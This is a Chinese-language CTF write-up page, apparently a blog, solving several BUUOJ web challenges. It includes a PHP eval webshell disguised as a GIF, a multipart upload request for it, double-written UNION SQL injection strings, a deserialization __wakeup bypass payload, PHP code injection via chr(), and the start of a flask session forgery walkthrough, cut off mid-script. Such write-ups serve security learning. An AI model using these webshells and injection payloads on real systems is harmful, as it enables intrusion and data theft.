id=\"极客大挑战-2019-Knife\"><a href=\"#极客大挑战-2019-Knife\" class=\"headerlink\" title=\"[极客大挑战 2019]Knife\"></a>[极客大挑战 2019]Knife</h1><p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121092431.png\"></p>\n<p>一句话直接连。</p>\n<hr>\n<h1 id=\"RoarCTF-2019-Easy-Calc\"><a href=\"#RoarCTF-2019-Easy-Calc\" class=\"headerlink\" title=\"[RoarCTF 2019]Easy Calc\"></a>[RoarCTF 2019]Easy Calc</h1><p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121092956.png\"></p>\n<p>一个计算器随便试一试，当输入字母时会报错。查看网页源码，在script中发现了运行计算器的php文件：<strong>calc.php</strong>，但是也有一句很重要的注释</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!--I&#x27;ve set up WAF to ensure security.--&gt;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121093233.png\"></p>\n<p>php的正则表达式中并没有过滤字母的条件，所以我们输入字母被过滤是因为<strong>WAF</strong>，接下来是参考网上的wp自己的理解</p>\n<p>可以在calc.php传参</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">? num=a</span><br></pre></td></tr></table></figure>\n\n<p>php会输出一个值a，说明已经绕过了WAF。这里使用的是WAF和php解析方法不一样，WAF解析到空格’ ‘会直接过滤掉，这样WAF认为传入的就是一个空值，并不会识别num，但是php解析的时候会把空格去掉，这样就能get到num的值。</p>\n<p>接下来绕过正则就可以使用char()的方式使用ascii码转。空格被过滤但是想使用php输出可以使用var_dump()</p>\n<p>查看根目录下文件，可以使用scandir（）遍历文件夹，其中char（47）——&gt;   ‘/‘  ：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">? num=1;var_dump(scandir(chr(47)))</span><br></pre></td></tr></table></figure>\n\n<p>找到了疑似flag文件：f1agg，使用file_get_contents（）读取文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?%20num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</span><br></pre></td></tr></table></figure>\n\n<hr>\n<h1 id=\"极客大挑战-2019-Http\"><a href=\"#极客大挑战-2019-Http\" class=\"headerlink\" title=\"[极客大挑战 2019]Http\"></a>[极客大挑战 2019]Http</h1><p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121104213.png\"></p>\n<p>查看源码在”氛围”这两个字上有隐藏的跳转Secret.php。进入以后页面显示</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">It doesn&#x27;t come from &#x27;https://www.Sycsecret.com&#x27;</span><br></pre></td></tr></table></figure>\n\n<p>提示页面不是来自这个网址，所以在HackBar上加上Referer。之后又提示</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Please use &quot;Syclover&quot; browser</span><br></pre></td></tr></table></figure>\n\n<p>加上User-Agent。提示</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">No!!! you can only read this locally!!!</span><br></pre></td></tr></table></figure>\n\n<p>加上X-Forwarded-For。<a href=\"https://www.runoob.com/w3cnote/http-x-forwarded-for.html\">HTTP X-Forwarded-For 介绍</a></p>\n<p>最终的请求头：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GET /Secret.php HTTP/1.1</span><br><span class=\"line\">Host: node3.buuoj.cn:26715</span><br><span class=\"line\">Upgrade-Insecure-Requests: 1</span><br><span class=\"line\">User-Agent: Syclover</span><br><span class=\"line\">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q=0.9</span><br><span class=\"line\">x-forwarded-for: 127.0.0.1</span><br><span class=\"line\">referer: https://www.Sycsecret.com</span><br><span class=\"line\">Connection: close</span><br></pre></td></tr></table></figure>\n\n<hr>\n<h1 id=\"极客大挑战-2019-PHP\"><a href=\"#极客大挑战-2019-PHP\" class=\"headerlink\" title=\"[极客大挑战 2019]PHP\"></a>[极客大挑战 2019]PHP</h1><p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121105104.png\"></p>\n<p>源码备份在<code>www.zip</code>中。下载以后有五个文件</p>\n<blockquote>\n<p>class.php</p>\n<p>flag.php</p>\n<p>index.js</p>\n<p>index.php</p>\n<p>style.css</p>\n</blockquote>\n<p>在index.php中有一段代码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">    include &#x27;class.php&#x27;;</span><br><span class=\"line\">    $select = $_GET[&#x27;select&#x27;];</span><br><span class=\"line\">    $res=unserialize(@$select);</span><br><span class=\"line\">    ?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>再结合又一个class.php，所以这道题考点应该是反序列化。</p>\n<p>class.php</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">include &#x27;flag.php&#x27;;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">class Name&#123;</span><br><span class=\"line\">    private $username = &#x27;nonono&#x27;;</span><br><span class=\"line\">    private $password = &#x27;yesyes&#x27;;</span><br><span class=\"line\"></span><br><span class=\"line\">    public function __construct($username,$password)&#123;</span><br><span class=\"line\">        $this-&gt;username = $username;</span><br><span class=\"line\">        $this-&gt;password = $password;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function __wakeup()&#123;</span><br><span class=\"line\">        $this-&gt;username = &#x27;guest&#x27;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function __destruct()&#123;</span><br><span class=\"line\">        if ($this-&gt;password != 100) &#123;</span><br><span class=\"line\">            echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;;</span><br><span class=\"line\">            echo &quot;You name is: &quot;;</span><br><span class=\"line\">            echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;;</span><br><span class=\"line\">            echo &quot;You password is: &quot;;</span><br><span class=\"line\">            echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;;</span><br><span class=\"line\">            die();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        if ($this-&gt;username === &#x27;admin&#x27;) &#123;</span><br><span class=\"line\">            global $flag;</span><br><span class=\"line\">            echo $flag;</span><br><span class=\"line\">        &#125;else&#123;</span><br><span class=\"line\">            echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;;</span><br><span class=\"line\">            die();</span><br><span class=\"line\"></span><br><span class=\"line\">            </span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>获取flag的代码位置是30-32行。分析这个Name对象，创建对象时可以为对象赋值，对象销毁时会判断password值是否是100，且username值是否为admin，如果两者都成立输出flag，但是__wakeup（）会在反序列化时调用将username值置为guest，所以需要反序列化逃逸。这里面有反序列化讲解<a href=\"https://www.cnblogs.com/zy-king-karl/p/11436872.html\">CVE-2016-7124漏洞复现</a></p>\n<p>我使用的构造对象</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">class Name&#123;</span><br><span class=\"line\">    private $username =&#x27;admin&#x27;;</span><br><span class=\"line\">    private $password =&#x27;100&#x27;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$a = new Name;</span><br><span class=\"line\">echo serialize($a);</span><br><span class=\"line\"></span><br><span class=\"line\">O:4:&quot;Name&quot;:2:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;s:3:&quot;100&quot;;&#125;</span><br></pre></td></tr></table></figure>\n\n<p>反序列化逃逸，使对象属性的数量大于原来的值，就可以绕过wakeup函数。最终payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?select=O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;s:3:&quot;100&quot;;&#125;</span><br></pre></td></tr></table></figure>\n\n<hr>\n<h1 id=\"极客大挑战-2019-Upload\"><a href=\"#极客大挑战-2019-Upload\" class=\"headerlink\" title=\"[极客大挑战 2019]Upload\"></a>[极客大挑战 2019]Upload</h1><p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121111429.png\"></p>\n<p>先尝试上传一个gif图片马内容为</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GIF89a</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">@eval($_POST[&#x27;a&#x27;]);</span><br></pre></td></tr></table></figure>\n\n<p>页面提示过滤：</p>\n<blockquote>\n<p> NO! HACKER! your file included ‘&lt;?’</p>\n</blockquote>\n<p>尝试script执行php代码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script language=&quot;php&quot;&gt;eval($_POST[&#x27;cmd&#x27;])&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n\n<p>可以上传，文件在/upload目录下。尝试修改后缀上传，phtml上传成功，可以执行php和script代码，使用蚁剑连接。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121112135.png\"></p>\n<hr>\n<h1 id=\"2021-01-28\"><a href=\"#2021-01-28\" class=\"headerlink\" title=\"2021.01.28\"></a>2021.01.28</h1><h1 id=\"极客大挑战-2019-BabySQL\"><a href=\"#极客大挑战-2019-BabySQL\" class=\"headerlink\" title=\"[极客大挑战 2019]BabySQL\"></a>[极客大挑战 2019]BabySQL</h1><p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210128113412.png\"></p>\n<p>尝试万能密码，发现报错了：1=1#’ and password=’123’，也许是or被过滤了或者删掉了，尝试大小写无果，但是尝试双写通过了。需要注意的是爆表，爆数据库的语句中有<strong>information</strong>这个词，其中的<strong>for</strong>也会被过滤。其他过滤的词我遇到的有：union，select、from、where、and。</p>\n<p>爆数据库（填密码）：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&#x27; uniunionon selselectect 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema=database() #</span><br></pre></td></tr></table></figure>\n\n<p>爆表：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&#x27; uniunionon selselectect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_schema=database() aandnd table_name=&#x27;b4bsql&#x27; #</span><br></pre></td></tr></table></figure>\n\n<p>爆字段值：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&#x27; uniunionon selselectect 1,2,group_concat(id,username,passwoorrd) ffromrom b4bsql #</span><br></pre></td></tr></table></figure>\n\n<hr>\n<h1 id=\"ACTF2020-新生赛-Upload\"><a href=\"#ACTF2020-新生赛-Upload\" class=\"headerlink\" title=\"[ACTF2020 新生赛]Upload\"></a>[ACTF2020 新生赛]Upload</h1><p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210128114257.png\"></p>\n<p>指针放在灯泡上护显示上传文件的，图片马</p>\n<p>233.gif</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GIF89a</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">@eval($_POST[&#x27;a&#x27;]);</span><br></pre></td></tr></table></figure>\n\n<p>尝试phtml是否被过滤，直接上传成功。蚁剑连接</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">------WebKitFormBoundaryUMSByAQmR2cduL6R</span><br><span class=\"line\">Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;233.phtml&quot;</span><br><span class=\"line\">Content-Type: image/gif</span><br><span class=\"line\"></span><br><span class=\"line\">GIF89a</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">@eval($_POST[&#x27;a&#x27;]);</span><br><span class=\"line\">------WebKitFormBoundaryUMSByAQmR2cduL6R</span><br><span class=\"line\">Content-Disposition: form-data; name=&quot;submit&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">upload</span><br><span class=\"line\">------WebKitFormBoundaryUMSByAQmR2cduL6R--</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<hr>\n<h1 id=\"ACTF2020-新生赛-BackupFile\"><a href=\"#ACTF2020-新生赛-BackupFile\" class=\"headerlink\" title=\"[ACTF2020 新生赛]BackupFile\"></a>[ACTF2020 新生赛]BackupFile</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Try to find out source file!</span><br></pre></td></tr></table></figure>\n\n<p>题目提示备份文件，备份文件常见后缀：</p>\n<blockquote>\n<p>.git .svn .swp .~ .bak .bash_history</p>\n</blockquote>\n<p>尝试index.php.bak，下载了一个备份文件：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">include_once &quot;flag.php&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">if(isset($_GET[&#x27;key&#x27;])) &#123;</span><br><span class=\"line\">    $key = $_GET[&#x27;key&#x27;];</span><br><span class=\"line\">    if(!is_numeric($key)) &#123;</span><br><span class=\"line\">        exit(&quot;Just num!&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    $key = intval($key);</span><br><span class=\"line\">    $str = &quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;;</span><br><span class=\"line\">    if($key == $str) &#123;</span><br><span class=\"line\">        echo $flag;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">else &#123;</span><br><span class=\"line\">    echo &quot;Try to find out source file!&quot;;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>传一个必须为数字的参数key，使用intval（）函数处理，字符串相等则输出flag。这就想到了PHP中的<code>==</code>和<code>===</code>的区别。贴一段简单代码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">$str = &#x27;abc&#x27;;</span><br><span class=\"line\">if(0==$str)&#123;</span><br><span class=\"line\">\techo &quot;真&quot;;</span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\">\techo &quot;假&quot;;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><code>==</code>在执行关系运算时，要求运算符两边的数据类型必须一致，所以等号右边的字符串被强制转换为了整型，若有一方为数字，另一方为字符串或空或null，均会先将非数字一方转化为0，再做比较。如果字符串是以数字开头的，就会截取直到遇到第一个字母。</p>\n<p>全等于<code>===</code>操作过程如下： </p>\n<ol>\n<li>操作符两边的数据类型如果不相同，返回false 。</li>\n<li>操作符两边的值如果不相同，返回false 。</li>\n<li>最后将上面2步的操作进行与操作。返回与操作的结果。</li>\n</ol>\n<p>所以最终的payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?key=123</span><br></pre></td></tr></table></figure>\n\n\n\n<hr>\n<h1 id=\"HCTF-2018-admin\"><a href=\"#HCTF-2018-admin\" class=\"headerlink\" title=\"[HCTF 2018]admin\"></a>[HCTF 2018]admin</h1><p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210202182820.png\"></p>\n<p>可以在注释里找到</p>\n<blockquote>\n<!-- you are not admin -->\n</blockquote>\n<p>思路应该是只要我们是admin登陆就可以得到flag，可以找到注册按钮，不能注册admin,那就随便注册一个进去看看。找到几个功能。</p>\n<ul>\n<li>post。发表文章，但是没能找到在哪里打开</li>\n<li>change password。改密码，尝试下能不能抓包改到admin的密码</li>\n</ul>\n<p>修改密码抓到的包：</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210202183647.png\"></p>\n<p>感觉并没有什么下手的地方，唯一的就是session可能和身份有关。</p>\n<p>以下的是看网上的wp</p>\n<p>在change password页面查看源码，发现提供了题目的源码地址</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">&lt;!-- https://github.com/woadsl1234/hctf_flask/ --&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>网站使用的是flask框架，具体路由表如下</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&#x27;/code&#x27;</span></span>)\t\t</span><span class=\"comment\">#二维码</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_code</span>():</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&#x27;/index&#x27;</span></span>)\t\t</span><span class=\"comment\">#首页</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">index</span>():</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&#x27;/register&#x27;</span>, methods = [<span class=\"string\">&#x27;GET&#x27;</span>, <span class=\"string\">&#x27;POST&#x27;</span>]</span>)\t\t</span><span class=\"comment\">#注册</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">register</span>():</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&#x27;/login&#x27;</span>, methods = [<span class=\"string\">&#x27;GET&#x27;</span>, <span class=\"string\">&#x27;POST&#x27;</span>]</span>)\t\t</span><span class=\"comment\">#登陆</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">login</span>():</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&#x27;/logout&#x27;</span></span>)\t\t</span><span class=\"comment\">#登出</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">logout</span>():</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&#x27;/change&#x27;</span>, methods = [<span class=\"string\">&#x27;GET&#x27;</span>, <span class=\"string\">&#x27;POST&#x27;</span>]</span>)\t\t</span><span class=\"comment\">#修改密码</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">change</span>():</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&#x27;/edit&#x27;</span>, methods = [<span class=\"string\">&#x27;GET&#x27;</span>, <span class=\"string\">&#x27;POST&#x27;</span>]</span>)\t\t</span><span class=\"comment\">#编辑信息</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">edit</span>():</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"解法一：flask-session伪造\"><a href=\"#解法一：flask-session伪造\" class=\"headerlink\" title=\"解法一：flask session伪造\"></a>解法一：flask session伪造</h2><p>这个解法和前面查看请求头时发现的session有关，flask框架是通过session来判断登录的用户身份，但是这个session是通过一些字符串拼接后加密的，所以如果我们可以知道字符串和加密算法，就可以实现伪造session。</p>\n<p>贴两篇相关文章：</p>\n<p><a href=\"https://xz.aliyun.com/t/3569\">Python Web之flask session&amp;格式化字符串漏洞</a></p>\n<p><a href=\"https://www.leavesongs.com/PENETRATION/client-session-security.html#\">客户端 session 导致的安全问题</a></p>\n<p>首先需要注册一个账号登陆上去，看看请求头Cookie里的session值。</p>\n<p>说明一下flask的session值加密格式是：<code>SECRET_KEY</code> +<code>一个用户对象的字符串</code>(就像PHP里的序列化后)。<code>SECRET_KEY</code>的值我们可以在源码里找到：<a href=\"https://github.com/woadsl1234/hctf_flask/blob/master/app/config.py%E4%B8%AD%E7%9A%84%E7%AC%AC%E5%9B%9B%E8%A1%8C\">https://github.com/woadsl1234/hctf_flask/blob/master/app/config.py中的第四行</a></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">SECRET_KEY = os.environ.get(&#x27;SECRET_KEY&#x27;) or &#x27;ckj123&#x27;</span><br></pre></td></tr></table></figure>\n\n<p>可以得知<code>SECRET_KEY</code>值为<code>ckj123</code>。然后在index.html页面发现只要session[‘name’] == ‘admin’即可以得到flag。接下来就要使用到一个解密工具，需要解密出用户字符串的格式，再将用户名改为admin，加密后再去请求，我们就可以以admin的身份登陆了。</p>\n<p>如下 <a href=\"https://www.leavesongs.com/\"><strong>P师傅</strong></a> 的程序解密：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python3</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"><span class=\"keyword\">import</span> zlib</span><br><span class=\"line\"><span class=\"keyword\">from</span> base64 <span class=\"keyword\">import</span> b64decode</span><br><span class=\"line\"><span class=\"keyword\">from</span> flask.sessions <span class=\"keyword\">import</span> session_json_serializer</span><br><span class=\"line\"><span class=\"keyword\">from</span> itsdangerous <span class=\"keyword\">import</span> base64_decode</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">decryption</span>(<span class=\"params\">payload</span>):</span></span><br><span class=\"line\">    payload, sig = payload.rsplit(<span class=\"string\">b&#x27;.&#x27;</span>, <span class=\"number\">1</span>)</span><br><span class=\"line\">    payload, timestamp = payload.rsplit(<span class=\"string\">b&#x27;.&#x27;</span>, <span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    decompress = <span class=\"literal\">False</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> payload.startswith(<span class=\"string\">b&#x27;.&#x27;</span>):</span><br><span class=\"line\">        payload = payload[<span class=\"number\">1</span>:]</span><br><span class=\"line\">        decompress = <span class=\"literal\">True</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        payload = base64_decode(payload)</span><br><span class=\"line\">    <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">        <span class=\"keyword\">raise</span> Exception(<span class=\"string\">&#x27;Could not base64 decode the payload because of &#x27;</span></span><br><span class=\"line\">                         <span class=\"string\">&#x27;an exception&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> decompress:</span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            payload = zlib.decompress(payload)</span><br><span class=\"line\">        <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">            <span 